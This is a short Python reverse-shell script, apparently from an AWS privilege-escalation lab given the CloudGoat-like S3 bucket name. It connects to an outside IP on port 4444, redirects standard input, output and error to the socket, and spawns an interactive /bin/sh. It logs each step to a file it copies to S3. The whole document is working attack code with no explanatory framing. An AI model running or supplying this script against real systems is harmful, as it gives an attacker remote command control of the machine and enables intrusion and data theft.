import socket,subprocess,os,sys

def log_to_s3(message):
    with open('/tmp/log.txt', 'a') as f:
        f.write(message + '\n')
    subprocess.call(['aws', 's3', 'cp', '/tmp/log.txt', 's3://cg-data-from-web-glue-privesc-cgid9xpmtof435/log.txt'])

try:
    log_to_s3("Script started")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    log_to_s3("Socket created")
    s.connect(("218.146.20.61", 4444))
    log_to_s3("Connection established")
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    log_to_s3("File descriptors duplicated")
    p=subprocess.call(["/bin/sh","-i"])
except Exception as e:
    log_to_s3(f"Error: {str(e)}")

log_to_s3("Script finished")
